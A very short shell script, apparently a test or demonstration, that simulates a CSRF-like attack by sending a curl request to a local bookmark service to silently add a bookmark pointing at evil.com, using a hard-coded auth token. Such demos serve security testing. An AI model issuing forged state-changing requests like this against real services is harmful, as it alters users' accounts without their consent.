
# Simulates a CSRF-like attack by silently adding a bookmark via an image request

AUTH=123456
curl "http://localhost:8888/$AUTH/add/full/test/http%3A%2F%2Fevil.com/EvilSite/1"
